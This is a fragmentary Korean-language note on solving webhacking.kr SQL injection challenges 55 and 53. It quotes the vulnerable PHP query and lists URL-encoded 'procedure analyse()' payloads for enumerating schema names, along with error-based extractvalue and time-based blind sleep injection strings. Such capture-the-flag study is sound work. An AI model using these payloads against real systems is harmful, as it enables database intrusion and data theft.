"SELECT id, flag, score FROM chall55 WHERE score=score파라미터
mysqli_query($db,"insert into chall55 values('{$_SESSION['id']}','".trim($_POST['score'])."','{$flag}')");

score=1%20limit%200,%201%20procedure%20analyse()      webhacking.chall55.id
score=1%20limit%201,%202%20procedure%20analyse()      webhacking.chall55.score
score=1%20limit%202,%201%20procedure%20analyse()     webhacking.chall55.p4ssw0rd_1123581321
//그냥 53번 문제처럼 필요없는 거 치우고 answer이나 입력값 맞추는 거 찾아서 
이 내용 집어넣으면 정답 같은데?? 
53번을 자세히 보면 
mysqli_fetch_array(mysqli_query($db,"select a from $hidden_table where a={$_GET['val']}"))로 값을 받는다는 것을 
알 수 있다 (55번 쿼리와 흡사하다) 
val=1 procedure analyse();로 하면 숨겨진 테이블이 나오고 
if($_GET['answer'] == $hidden_table) solve(53);
여기 if문에 나온 것처럼 ?answer=에 숨겨진 테이블을 그대로 쳐주면 (webhackin이랑 a만 떼서) 
원하는 결과값이 나오는 것을 알 수 있다 (문제가 풀린다)   

가설 1 : insert 를 이용해서 (원하는 id, score, flag) 값을 차례대로 넣는다 
그 후에 select를 이용해서 특정한 score값을 그대로 쳐서 원하는 값을 뽑아낸다 
->이거랑 상관없이 테이블명을 알았으므로 left와 right를 이용해서 
브루트포싱하는 문제였다 

여기서 기본적인 input은 id, score, flag 이 세가지라고 할 수 있다 
id로는 기존에 있는 값을 넣어도 변화가 없다는 것을 알 수 있다 (결과값이 딱히 없다) 
score로 찾아야 된다는 건데(확실치는 않음?) 1123581321이 너무 score 같아서 
이 값을 넣었으나 별다른 값을 뱉어내지는 않았다 
id나 pw 혹은 flag로도 이리저리 가능한 조합을 모두 넣어보았으나 역시나 별다른 결과값이 나오지 않았다 

mysql> select id from test where no=1 limit 0,1 procedure analyse();   // 첫째 필드
mysql> select id from test where no=1 limit 1,1 procedure analyse();   // 둘째 필드
mysql> select id from test where no=1 limit 2,1 procedure analyse();   // 셋째 필드

Procedure analyse() 를 사용하여 쿼리 명령 시 DB명.테이블명.컬럼명 획득이 가능하다.
하지만, procedure analyse()라는 함수는 limit 절 뒤에 사용이 가능하다.
즉, limit 구문을 앞에 추가하여 필드를 차례로 뽑아내는 것이 가능하다는 이야기이다.

mysqli_query($db,"insert into chall55 values('{$_SESSION['id']}','".trim($_POST['score'])."','{$flag}')");

여기서, 추가적으로 extravalue() 함수를 사용하여 procedure() 함수 내에서 원하는 값을 뽑아낼 수 있다.

- error base

mysql > SELECT id FROM test WHERE id='admin' limit 0,1 procedure analyse(extractvalue(1, concat(0x3a, version())), 1);

ERROR 1105 (HY000): XPATH syntax error: ':5.1.41-community'



- blind

mysql > SELECT id FROM test WHERE id='admin' limit 0,1 procedure analyse(extractvalue(1, concat(0x3a, (if(mid(version(),1,1) like 5, sleep(5),1))), 1);

?score = p4ssw0rd_1123581321    ->       id : mpaljo112 // 0

?score=1123581321 limit 0,1 procedure analyse(extractvalue(1, concat(0x3a, version())), 1);

?score=2147483647 limit 0,1 procedure analyse(extractvalue(1, concat(0x3a, version())), 1);

('panda',%20'2378124',%20'chall55.p4ssw0rd_1123581321');   2378124

insert into chall55 values('panda',%20'2378124',%20'chall55.p4ssw0rd_1123581321');
